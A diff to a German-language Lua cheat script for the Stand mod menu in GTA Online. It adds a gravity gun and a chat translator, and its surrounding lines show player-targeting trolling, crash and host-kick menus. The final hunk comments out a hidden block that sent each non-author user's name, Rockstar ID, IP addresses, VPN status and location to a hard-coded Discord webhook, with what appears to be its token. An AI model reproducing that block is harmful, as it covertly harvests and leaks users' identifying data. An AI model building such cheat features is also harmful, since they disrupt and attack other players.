@@ -1,7 +1,7 @@
 util.require_natives("natives-1681379138", "g-uno")
 util.require_natives("2944b", "g")
 local response = false
-local localVer = 0.61
+local localVer = 0.62
 local currentVer
 async_http.init("raw.githubusercontent.com", "/TheaterChaos/Mein-zeug/main/Meinzeugversion", function(output)
     currentVer = tonumber(output)
@@ -701,6 +701,15 @@ function savevehicleingarage(vehhandle, input)
 	end
 	::end::
 	return true
+end
+
+function getcurrentweaponofped(ped)
+	local currentWpMem = memory.alloc()
+	local junk = GET_CURRENT_PED_WEAPON(ped, currentWpMem, 1)
+	local holdingnweapon = memory.read_int(currentWpMem)
+	if holdingnweapon ~= number then
+		return holdingnweapon
+	end
 end
 
 local minimum = memory.alloc()
@@ -1668,17 +1677,17 @@ local options <const> = {"zu Meinem", "zu Seinem"}
 
 local function player(pid)
     menu.divider(menu.player_root(pid), "Selfmade")
-	local main = menu.list(menu.player_root(pid), "Selfmade", {"PlMein"}, "")
-    local bozo = menu.list(main, "Notizen", {"Notizen"}, "")
-	local anderes = menu.list(main, "anderes zeug", {"anderes"}, "")
-	local orgthings = menu.list(main, "org zeug", {"orgthings"}, "wenn du im org bist wird nichts davon auf dich gemacht")
-	local orgthingsteleport = menu.list(orgthings, "Teleportieren", {"orgtele"}, "")
-	local orgthingsfriendly = menu.list(orgthings, "Freundlich", {"orgfriendlys"}, "")
-	local orgthingsfriendlyvehicle = menu.list(orgthingsfriendly, "Vehicle", {"orgfriendlysvehicle"}, "")
-	local orgthingsweapons = menu.list(orgthings, "Waffen", {"orgweapons"}, "")
-	local orgthingstrolling = menu.list(orgthings, "Trolling", {"orgtrolling"}, "")
-	local orgthingstrollingvehicle = menu.list(orgthingstrolling, "Vehicle", {"orgtrollingvehicle"}, "")
-	local orgthingscrash = menu.list(orgthings, "Crash", {"orgcrash"}, "")
+	main = menu.list(menu.player_root(pid), "Selfmade", {"PlMein"}, "")
+    bozo = menu.list(main, "Notizen", {"Notizen"}, "")
+	anderes = menu.list(main, "anderes zeug", {"anderes"}, "")
+	orgthings = menu.list(main, "org zeug", {"orgthings"}, "wenn du im org bist wird nichts davon auf dich gemacht")
+	orgthingsteleport = menu.list(orgthings, "Teleportieren", {"orgtele"}, "")
+	orgthingsfriendly = menu.list(orgthings, "Freundlich", {"orgfriendlys"}, "")
+	orgthingsfriendlyvehicle = menu.list(orgthingsfriendly, "Vehicle", {"orgfriendlysvehicle"}, "")
+	orgthingsweapons = menu.list(orgthings, "Waffen", {"orgweapons"}, "")
+	orgthingstrolling = menu.list(orgthings, "Trolling", {"orgtrolling"}, "")
+	orgthingstrollingvehicle = menu.list(orgthingstrolling, "Vehicle", {"orgtrollingvehicle"}, "")
+	orgthingscrash = menu.list(orgthings, "Crash", {"orgcrash"}, "")
 	--local spam = menu.list(main, "spam zeug", {"spamzeug"}, "")
 
 	--[[menu.toggle(spam, "alle loops", {}, "auto spam besser selber an machen sonst kaka", function(on_toggle)
@@ -2637,10 +2646,10 @@ onlymissionToggleveh = menu.toggle(Entitymanagerespvehicle, "Show Only Mission",
 end, showonlymissionveh)
 showonlymissionveh = menu.get_value(onlymissionToggleveh)
 
-local actionSubmenuveh = menu.list(Entitymanagerespvehicle, "Action", {}, "action für die auf dennen ESP drauf ist")
-local actionsettingsSubmenuveh = menu.list(actionSubmenuveh, "Settings", {}, "")
-local explosiontype = 6
-local explosionsettingveh = menu.list_select(actionsettingsSubmenuveh, "Explosion", {}, "Explosion wie haftbomben oder granaten haben eine grenze also nicht wundern", EXPLOSIONVARIATION, explosiontype, function(value)
+actionSubmenuveh = menu.list(Entitymanagerespvehicle, "Action", {}, "action für die auf dennen ESP drauf ist")
+actionsettingsSubmenuveh = menu.list(actionSubmenuveh, "Settings", {}, "")
+explosiontype = 6
+explosionsettingveh = menu.list_select(actionsettingsSubmenuveh, "Explosion", {}, "Explosion wie haftbomben oder granaten haben eine grenze also nicht wundern", EXPLOSIONVARIATION, explosiontype, function(value)
 	explosiontype = value
 end)
 onlyvisibleToggleveh = menu.toggle(actionSubmenuveh, "get only visible vehs", {}, "", function(on)
@@ -2799,7 +2808,7 @@ menu.toggle_loop(actionSubmenuveh, "UN Freeze", {}, "", function()
 	end
 end)
 
-local positionSubmenuveh = menu.list(Entitymanagerespvehicle, "position", {}, "")
+positionSubmenuveh = menu.list(Entitymanagerespvehicle, "position", {}, "")
 xSliderveh = menu.slider(positionSubmenuveh, "XPos", {}, "", -10, 10, xValueveh, 1, function(val)
 	xValueveh = val / 200
 end)
@@ -2990,9 +2999,9 @@ onlyblibsToggleped = menu.toggle(Entitymanageresppeds, "Show Only peds with blib
 end, showonlyblibsped)
 showonlyblibsped = menu.get_value(onlyblibsToggleped)
 
-local actionSubmenuped = menu.list(Entitymanageresppeds, "Action", {}, "action für die auf dennen ESP drauf ist")
-local actionsettingsSubmenuped = menu.list(actionSubmenuped, "Settings", {}, "")
-local explosionsettingped = menu.list_select(actionsettingsSubmenuped, "Explosion", {}, "Explosion wie haftbomben oder granaten haben eine grenze also nicht wundern", EXPLOSIONVARIATION, explosiontype, function(value)
+actionSubmenuped = menu.list(Entitymanageresppeds, "Action", {}, "action für die auf dennen ESP drauf ist")
+actionsettingsSubmenuped = menu.list(actionSubmenuped, "Settings", {}, "")
+explosionsettingped = menu.list_select(actionsettingsSubmenuped, "Explosion", {}, "Explosion wie haftbomben oder granaten haben eine grenze also nicht wundern", EXPLOSIONVARIATION, explosiontype, function(value)
 	explosiontype = value
 end)
 onlyvisibleToggleped = menu.toggle(actionSubmenuped, "get only visible peds", {}, "", function(on)
@@ -3158,7 +3167,7 @@ menu.action(actionSubmenuped, "Leave all vehicle", {}, "", function()
 	end
 end)
 
-local positionSubmenuped = menu.list(Entitymanageresppeds, "position", {}, "")
+positionSubmenuped = menu.list(Entitymanageresppeds, "position", {}, "")
 xSliderped = menu.slider(positionSubmenuped, "XPos", {}, "", -10, 10, xValueped, 1, function(val)
 	xValueped = val / 200
 end)
@@ -7279,9 +7288,184 @@ menu.toggle_loop(Entitymanager, "Entity aim Controle", {}, "", function()
 	end
 end)
 
+function raycast_gameplay_cam(flag, distance)
+    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
+    local cam_rot = GET_GAMEPLAY_CAM_ROT(0)
+    local cam_pos = GET_GAMEPLAY_CAM_COORD()
+    local direction = v3.toDir(cam_rot)
+    local destination = 
+    { 
+        x = cam_pos.x + direction.x * distance, 
+        y = cam_pos.y + direction.y * distance, 
+        z = cam_pos.z + direction.z * distance 
+    }
+    GET_SHAPE_TEST_RESULT(
+        START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
+            cam_pos.x, 
+            cam_pos.y, 
+            cam_pos.z, 
+            destination.x, 
+            destination.y, 
+            destination.z, 
+            flag, 
+            players.user_ped(), 
+            1
+        ), ptr1, ptr2, ptr3, ptr4)
+    local p1 = memory.read_int(ptr1)
+    local p2 = memory.read_vector3(ptr2)
+    local p3 = memory.read_vector3(ptr3)
+    local p4 = memory.read_int(ptr4)
+    return {p1, p2, p3, p4}
+end
+
+function get_offset_from_gameplay_camera(distance)
+	local cam_rot = GET_GAMEPLAY_CAM_ROT(2)
+	local cam_pos = GET_GAMEPLAY_CAM_COORD()
+	local direction = v3.toDir(cam_rot)
+	local destination = v3(direction)
+	destination:mul(distance)
+	destination:add(cam_pos)
+
+	return destination
+end
+
+Entitymanagergravitygun = menu.list(Entitymanager, "Gravity gun", {}, "")
 
 
+menu.toggle_loop(Entitymanagergravitygun, "Gravity gun", {}, "Ziele auf sachen drauf um sie rum zu bewegen\nFahrezuge kann man auch mit schießen werfen\nmanche objekte können nicht weit weg von seinem spawn punkt die despawnen dann einfach", function()
+	local entpointer = memory.alloc()
+	local enitity = GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), entpointer)
+	local handle = memory.read_int(entpointer)
+	local holdingnweapon = getcurrentweaponofped(players.user_ped())
+	local coords = get_offset_from_gameplay_camera(gravitiygundist)
+	local shootthetarget = false
+	if not enitity then
+		return
+	end
+	if IS_ENTITY_A_PED(handle) then
+		local vehofped = GET_VEHICLE_PED_IS_IN(handle, true)
+		if vehofped != 0 then
+			handle = vehofped
+		else
+			if IS_PED_A_PLAYER(handle) then
+				return
+			end
+		end
+	end
+	if gravitiygunonlyapsniper then
+		if not table.contains({584646201, 100416529}, holdingnweapon) then
+			return
+		end
+	end
+	if (IS_ENTITY_A_PED(handle) and not gravitiygunPED) or (IS_ENTITY_A_VEHICLE(handle) and not gravitiygunVEHICLE) or (IS_ENTITY_AN_OBJECT(handle) and not gravitiygunOBJECT) then
+		return
+	end
+	--holdingnweapon != tonumber(584646201) or holdingnweapon != tonumber(100416529)
+	local hadcollison = GET_ENTITY_COLLISION_DISABLED(handle)
+	local ismissionentity = IS_ENTITY_A_MISSION_ENTITY(handle)
+	local canmigrade = entities.get_can_migrate(handle)
+	repeat
+		if not DOES_ENTITY_EXIST(handle) then
+			break
+		end
+		coords = get_offset_from_gameplay_camera(gravitiygundist)
+		if entities.request_control(handle) then
+			if gravitiygunswitchowner then
+				entities.set_can_migrate(handle, false)
+			end
+			FREEZE_ENTITY_POSITION(handle, true)
+			--[[if gravitiyguncollisionoff then
+				SET_ENTITY_COLLISION(handle, false, true)
+			end]]
+			SET_ENTITY_AS_MISSION_ENTITY(handle, true)
+			SET_ENTITY_COORDS_NO_OFFSET(handle, coords.x, coords.y, coords.z, 0,0,0)
+			if IS_PED_SHOOTING(players.user_ped()) and IS_ENTITY_A_VEHICLE(handle) then
+				shootthetarget = true
+				break
+			end
+		end
+		util.yield()
+	until not IS_PLAYER_FREE_AIMING(players.user())
+	--[[if not hadcollison and gravitiyguncollisionoff then
+		SET_ENTITY_COLLISION(handle, true, true)
+	end]]
+	if not ismissionentity then
+		local ent_ptr = memory.alloc_int()
+		memory.write_int(ent_ptr, handle)
+		SET_ENTITY_AS_NO_LONGER_NEEDED(ent_ptr)
+	end
+	if not gravitiygunfreezeonletgo then
+		FREEZE_ENTITY_POSITION(handle, false)
+	end
+	if canmigrade and gravitiygunswitchowner then
+		entities.set_can_migrate(handle, true)
+	end
+	if shootthetarget then
+		FREEZE_ENTITY_POSITION(handle, false)
+		local c1 = GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0.0, 5.0, 0.0)
+		local res = raycast_gameplay_cam(-1, 1000.0)
+		local dir = {}
+		local c2 = {}
+		if res[1] ~= 0 then
+			c2 = res[2]
+			dir['x'] = (c2['x'] - c1['x'])*1000
+			dir['y'] = (c2['y'] - c1['y'])*1000
+			dir['z'] = (c2['z'] - c1['z'])*1000
+		else 
+			c2 = get_offset_from_gameplay_camera(1000)
+			dir['x'] = (c2['x'] - c1['x'])*1000
+			dir['y'] = (c2['y'] - c1['y'])*1000
+			dir['z'] = (c2['z'] - c1['z'])*1000
+		end
+		APPLY_FORCE_TO_ENTITY(handle, 1, dir['x'], dir['y'], dir['z'], 0.0, 0.0, 0.0, 1, false, true, true, true, true)
+		util.yield(1000)
+	end
+end)
+gravitiygunonlyapsniper, gravitiygunfreezeonletgo, gravitiygunswitchowner = true, false, true
+gravitiygunPED, gravitiygunVEHICLE, gravitiygunOBJECT = true, true, true
+gravitiygundist = 30
 
+menu.divider(Entitymanagergravitygun, "SETTINGS")
+
+Entitymanagergravitygundist = menu.slider(Entitymanagergravitygun, "Range to load", {"setdistnearenittys"}, "", 10, 100, gravitiygundist, 5, function(val)
+	gravitiygundist = val
+end)
+gravitiygundist = menu.get_value(Entitymanagergravitygundist)
+
+Entitymanagergravitygunonlyapsniper = menu.toggle(Entitymanagergravitygun, "Only with AP / Sniperrifle", {}, "Gravity gun geht nur mit:\nAP-Pistole\nScharfschützengewehr / sniper rifle", function(value)
+	gravitiygunonlyapsniper = value
+end, gravitiygunonlyapsniper)
+gravitiygunonlyapsniper = menu.get_value(Entitymanagergravitygunonlyapsniper)
+
+Entitymanagergravitygunfreezletgo = menu.toggle(Entitymanagergravitygun, "Freeze position on let go", {}, "", function(value)
+	gravitiygunfreezeonletgo = value
+end, gravitiygunfreezeonletgo)
+gravitiygunfreezeonletgo = menu.get_value(Entitymanagergravitygunfreezletgo)
+
+--[[Entitymanagergravitygundeactivatecollison = menu.toggle(Entitymanagergravitygun, "Deactivate collison while carry", {}, "", function(value)
+	gravitiyguncollisionoff = value
+end, gravitiyguncollisionoff)
+gravitiyguncollisionoff = menu.get_value(Entitymanagergravitygundeactivatecollison)]]
+
+Entitymanagergravitygunswitchowner = menu.toggle(Entitymanagergravitygun, "Switch owner of enitity", {}, "kann manchmal zu bugs kommen einfach sicherheits halber aussaltbar gemacht", function(value)
+	gravitiygunswitchowner = value
+end, gravitiygunswitchowner)
+gravitiygunswitchowner = menu.get_value(Entitymanagergravitygunswitchowner)
+
+menu.divider(Entitymanagergravitygun, "ENTITYS")
+
+EntitymanagergravitygunPED = menu.toggle(Entitymanagergravitygun, "PED", {}, "", function(value)
+	gravitiygunPED = value
+end, gravitiygunPED)
+gravitiygunPED = menu.get_value(EntitymanagergravitygunPED)
+EntitymanagergravitygunVEHICLE = menu.toggle(Entitymanagergravitygun, "VEHICLE", {}, "", function(value)
+	gravitiygunVEHICLE = value
+end, gravitiygunVEHICLE)
+gravitiygunVEHICLE = menu.get_value(EntitymanagergravitygunVEHICLE)
+EntitymanagergravitygunOBJECT = menu.toggle(Entitymanagergravitygun, "OBJECT", {}, "", function(value)
+	gravitiygunOBJECT = value
+end, gravitiygunOBJECT)
+gravitiygunOBJECT = menu.get_value(EntitymanagergravitygunOBJECT)
 
 
 --- Context Menu Manager
@@ -8212,6 +8396,7 @@ local anti_laender_zeug = menu.list(player_zeug, "Anti Länder zeug", {}, "")
 local leanderauswahl = menu.list(anti_laender_zeug, "länder auswahl", {}, "")
 local ESP = menu.list(player_zeug, "ESP", {}, "")
 local antivehicleaction = menu.list(player_zeug, "Anti vehicle action", {}, "")
+local translator = menu.list(player_zeug, "Translator", {}, "")
 --local selfmadeplayerhistory = menu.list(player_zeug, "Player history", {}, "")
 
 
@@ -9325,6 +9510,200 @@ menu.action(selfmadeplayerhistory, "clear textfile", {}, "",function()
    	file:write()
 	file:close()
 end)]]
+
+
+
+
+local Languages = {
+	{ Name = "Afrikaans", Key = "af" },
+	{ Name = "Albanian", Key = "sq" },
+	{ Name = "Arabic", Key = "ar" },
+	{ Name = "Azerbaijani", Key = "az" },
+	{ Name = "Basque", Key = "eu" },
+	{ Name = "Belarusian", Key = "be" },
+	{ Name = "Bengali", Key = "bn" },
+	{ Name = "Bulgarian", Key = "bg" },
+	{ Name = "Catalan", Key = "ca" },
+	{ Name = "Chinese Simplified", Key = "zh-CN" },
+	{ Name = "Chinese Traditional", Key = "zh-TW" },
+	{ Name = "Croatian", Key = "hr" },
+	{ Name = "Czech", Key = "cs" },
+	{ Name = "Danish", Key = "da" },
+	{ Name = "Dutch", Key = "nl" },
+	{ Name = "English", Key = "en" },
+	{ Name = "Esperanto", Key = "eo" },
+	{ Name = "Estonian", Key = "et" },
+	{ Name = "Filipino", Key = "tl" },
+	{ Name = "Finnish", Key = "fi" },
+	{ Name = "French", Key = "fr" },
+	{ Name = "Galician", Key = "gl" },
+	{ Name = "Georgian", Key = "ka" },
+	{ Name = "German", Key = "de" },
+	{ Name = "Greek", Key = "el" },
+	{ Name = "Gujarati", Key = "gu" },
+	{ Name = "Haitian Creole", Key = "ht" },
+	{ Name = "Hebrew", Key = "iw" },
+	{ Name = "Hindi", Key = "hi" },
+	{ Name = "Hungarian", Key = "hu" },
+	{ Name = "Icelandic", Key = "is" },
+	{ Name = "Indonesian", Key = "id" },
+	{ Name = "Irish", Key = "ga" },
+	{ Name = "Italian", Key = "it" },
+	{ Name = "Japanese", Key = "ja" },
+	{ Name = "Kannada", Key = "kn" },
+	{ Name = "Korean", Key = "ko" },
+	{ Name = "Latin", Key = "la" },
+	{ Name = "Latvian", Key = "lv" },
+	{ Name = "Lithuanian", Key = "lt" },
+	{ Name = "Macedonian", Key = "mk" },
+	{ Name = "Malay", Key = "ms" },
+	{ Name = "Maltese", Key = "mt" },
+	{ Name = "Norwegian", Key = "no" },
+	{ Name = "Persian", Key = "fa" },
+	{ Name = "Polish", Key = "pl" },
+	{ Name = "Portuguese", Key = "pt" },
+	{ Name = "Romanian", Key = "ro" },
+	{ Name = "Russian", Key = "ru" },
+	{ Name = "Serbian", Key = "sr" },
+	{ Name = "Slovak", Key = "sk" },
+	{ Name = "Slovenian", Key = "sl" },
+	{ Name = "Spanish", Key = "es" },
+	{ Name = "Swahili", Key = "sw" },
+	{ Name = "Swedish", Key = "sv" },
+	{ Name = "Tamil", Key = "ta" },
+	{ Name = "Telugu", Key = "te" },
+	{ Name = "Thai", Key = "th" },
+	{ Name = "Turkish", Key = "tr" },
+	{ Name = "Ukrainian", Key = "uk" },
+	{ Name = "Urdu", Key = "ur" },
+	{ Name = "Vietnamese", Key = "vi" },
+	{ Name = "Welsh", Key = "cy" },
+	{ Name = "Yiddish", Key = "yi" },
+}
+
+local LangKeys = {}
+local LangName = {}
+local LangIndexes = {}
+local LangLookupByName = {}
+local LangLookupByKey = {}
+local PlayerSpooflist = {}
+local PlayerSpoof = {}
+
+for i=1,#Languages do
+	local Language = Languages[i]
+	LangKeys[i] = Language.Name
+	LangName[i] = Language.Name
+	LangIndexes[Language.Key] = i
+	LangLookupByName[Language.Name] = Language.Key
+	LangLookupByKey[Language.Key] = Language.Name
+end
+
+table.sort(LangKeys)
+
+function encode(text)
+	return string.gsub(text, "%s", "+")
+end
+
+local translationonoff = false
+
+menu.toggle(translator, "Toggle Translator", {}, "", function(value)
+	translationonoff = value 
+end)
+
+targetlangmenu = menu.list_select(translator, "Target Language", {}, "You need to click to aply change", LangName, 24, function(s)
+	targetlang = LangLookupByName[LangKeys[s]]
+end)
+
+
+tradlocamenu = menu.list_select(translator, "Location of Traducted Message", {}, "You need to click to aply change", {"Team Chat not networked", "Team Chat networked", "Global Chat not networked", "Global Chat networked", "Notification"}, 5, function(s)
+	Tradloca = s
+end)
+
+traductself = true
+menu.toggle(translator, "Traduct Yourself", {}, "", function(on)
+	traductself = on	
+end, true)
+traductsamelang = false
+menu.toggle(translator, "Traduct even if the language is the same as the desired one", {}, "might not work correctly because google is dumb", function(on)
+	traductsamelang = on	
+end)
+
+traductmymessage = menu.list(translator, "Send Traducted message")
+finallangmenu = menu.list_select(traductmymessage, "Final Language", {"finallang"}, "Final Languge of your message.																	  You need to click to aply change", LangName, 1, function(s)
+   targetlangmessagesend = LangLookupByName[LangKeys[s]]
+end)
+
+menu.action(traductmymessage, "Send Message", {"Sendmessage"}, "Input the text For your message", function(on_click)
+    util.toast("Please input your message")
+    menu.show_command_box("Sendmessage ")
+end, function(on_command)
+    mytext = on_command
+    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
+		if Sucess ~= "" then
+			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
+			for _, pId in ipairs(players.list()) do
+				chat.send_targeted_message(pId, players.user(),string.gsub(translation, "%+", " "), false)
+			end
+		end
+	end)
+    async_http.dispatch()
+end)
+botsend = false
+ran = 0
+chat.on_message(function(packet_sender, message_sender, text, team_chat)
+	if not translationonoff then
+		return
+	end
+	if not botsend then
+		if not traductself and (packet_sender == players.user()) then
+		else
+		async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
+			if Sucess ~= "" then
+				translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
+				if not traductsamelang and (string.sub(sourceLang,0,2) == "en") or (string.sub(sourceLang,0,2) == "de") then
+					goto end
+				end
+				if not traductsamelang and (sourceLang == targetlang) then
+					goto end
+				end
+				if string.match(string.gsub(translation, "%+", " "), original) then
+					goto end
+				end
+					if (Tradloca == 1) then	
+						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), true, true, false)
+					end if (Tradloca == 2) then
+						botsend = true
+						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), true, true, true)
+					end if (Tradloca == 3) then
+						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), false, true, false)
+					end if (Tradloca == 4) then
+						botsend = true
+						chat.send_message(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), false, true, true)
+					end if (Tradloca == 5) then
+						util.toast(players.get_name(packet_sender).." : "..string.gsub(translation, "%+", " "), TOAST_ALL)
+					end
+				::end::
+			end
+		end)
+		async_http.dispatch()
+		end
+	end
+	botsend = false
+end)
+
+run = 0
+while run<10 do 
+	Tradloca = menu.get_value(tradlocamenu)
+	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
+	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
+	util.yield()
+	run = run+1
+end
+
+
+
+
+
 
 menu.action(player_zeug, "Get Host", {}, "kickt die leute die vor dir host werden\njoa geht irgendwie geht halt nicht direkt",function()
 	local phostpos = players.get_host_queue_position(players.user())
@@ -12265,36 +12644,36 @@ end)
 	util.yield(1000)
 	util.toast(numberofthings)
 end)]]
-if players.get_name(players.user()) != "TheaterChaos20" then
-	local webhookforloginscript = "api/webhooks/1225201202606637149/mfhhPyus6d2eREYtz7fDe3Q8XJEWqOxcwwI0mB91oTmGOR4xsc8tLg9Pml2rcyJXkhZh"
-	local descriptionforwebhooklogin = ""
-	local languagesforwebhooklogins = get_ip_data(tostring(soup.IpAddr(players.get_connect_ip(players.user()))))
-	descriptionforwebhooklogin = "Name: ".. players.get_name(players.user()) .."\\n"
-	descriptionforwebhooklogin = descriptionforwebhooklogin .."RID: ".. players.get_rockstar_id(players.user()) .."\\n"
-	descriptionforwebhooklogin = descriptionforwebhooklogin .."Land: ".. languagesforwebhooklogins.country.." // Stadt: "..languagesforwebhooklogins.city.." // Staat: "..languagesforwebhooklogins.state .."\\n"
-	descriptionforwebhooklogin = descriptionforwebhooklogin .."VPN: ".. players.is_using_vpn(players.user()) .."\\n"
-	descriptionforwebhooklogin = descriptionforwebhooklogin .."IP: ".. tostring(soup.IpAddr(players.get_ip(players.user()))).."// Connect IP: ".. tostring(soup.IpAddr(players.get_connect_ip(players.user()))).."// Lan IP: ".. tostring(soup.IpAddr(players.get_lan_ip(players.user()))).."\\n"
-	local bodyforloginwebhook = [[
-		{
-			"embeds": [
-			  {
-				"description": "]] .. descriptionforwebhooklogin .. [[",
-				"timestamp": "]] .. os.date("!%Y-%m-%dT%XZ") .. [[",
-				"color": null,
-				"author": {
-				  "name": "]] .. players.get_name(players.user()) .. [[",
-				  "icon_url": "https://raw.githubusercontent.com/NovaPlays134/NovaHook/main/resources/NovaHook/webhook_logo.png"
-				}
-			  }
-			],
-			"username": "Login in Script",
-			"avatar_url": "https://raw.githubusercontent.com/NovaPlays134/NovaHook/main/resources/NovaHook/webhook_logo.png"
-		}
-	]]
-	async_http.init("discord.com", webhookforloginscript, function() end, function() end)
-	async_http.set_post("application/json", bodyforloginwebhook)
-	async_http.dispatch()
-end
+--if players.get_name(players.user()) != "TheaterChaos20" then
+--	local webhookforloginscript = "api/webhooks/1225201202606637149/mfhhPyus6d2eREYtz7fDe3Q8XJEWqOxcwwI0mB91oTmGOR4xsc8tLg9Pml2rcyJXkhZh"
+--	local descriptionforwebhooklogin = ""
+--	local languagesforwebhooklogins = get_ip_data(tostring(soup.IpAddr(players.get_connect_ip(players.user()))))
+--	descriptionforwebhooklogin = "Name: ".. players.get_name(players.user()) .."\\n"
+--	descriptionforwebhooklogin = descriptionforwebhooklogin .."RID: ".. players.get_rockstar_id(players.user()) .."\\n"
+--	descriptionforwebhooklogin = descriptionforwebhooklogin .."Land: ".. languagesforwebhooklogins.country.." // Stadt: "..languagesforwebhooklogins.city.." // Staat: "..languagesforwebhooklogins.state .."\\n"
+--	descriptionforwebhooklogin = descriptionforwebhooklogin .."VPN: ".. players.is_using_vpn(players.user()) .."\\n"
+--	descriptionforwebhooklogin = descriptionforwebhooklogin .."IP: ".. tostring(soup.IpAddr(players.get_ip(players.user()))).."// Connect IP: ".. tostring(soup.IpAddr(players.get_connect_ip(players.user()))).."// Lan IP: ".. tostring(soup.IpAddr(players.get_lan_ip(players.user()))).."\\n"
+--	local bodyforloginwebhook = [[
+--		{
+--			"embeds": [
+--			  {
+--				"description": "]] .. descriptionforwebhooklogin .. [[",
+--				"timestamp": "]] .. os.date("!%Y-%m-%dT%XZ") .. [[",
+--				"color": null,
+--				"author": {
+--				  "name": "]] .. players.get_name(players.user()) .. [[",
+--				  "icon_url": "https://raw.githubusercontent.com/NovaPlays134/NovaHook/main/resources/NovaHook/webhook_logo.png"
+--				}
+--			  }
+--			],
+--			"username": "Login in Script",
+--			"avatar_url": "https://raw.githubusercontent.com/NovaPlays134/NovaHook/main/resources/NovaHook/webhook_logo.png"
+--		}
+--	]]
+--	async_http.init("discord.com", webhookforloginscript, function() end, function() end)
+--	async_http.set_post("application/json", bodyforloginwebhook)
+--	async_http.dispatch()
+--end
 loadtoggleoptionjobs()
 vehicle_spawn_list(antiactionvehicles)
 util.create_tick_handler(cmm.context_menu_draw_tick)
